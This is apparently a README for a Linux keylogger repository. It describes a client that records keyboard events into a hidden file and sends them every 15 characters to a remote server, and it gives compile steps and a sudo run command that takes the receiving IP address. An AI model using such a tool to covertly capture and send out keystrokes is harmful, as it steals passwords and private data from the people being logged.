# key-logger
Linux key logger with remote connection to send data.<br/>

Content:<br/>
1) zserver.c: source file for a server in C to receive the keys. See comments in file.<br/>
2) zklog.ccp: source file for the keylogger client listening to keyboard events EV_KEY. It creates a hidden file .outputz.txt and send every 15 characters to the remote server.<br/>
3) kloglist2.txt is the Linux Kernel event list & numbers. It gets loaded by zklog<br/><br/>

How to use it (on same machine, 2 different terminals):<br/>
1) Compile server:gcc zserver.c -o zserver<br/>
2) Compile keylogger: g++ zklog.cpp -o zklog<br/>
3) Start server:  ./zserver<br/>
4) Start keylogger. Usage sudo ./zklog /dev/input/eventX IPADDRESS<br/><br/>

Note X has to be found, run ./zklog to see which event file is the keyboard connected to. IPADDRESS=127.0.0.1


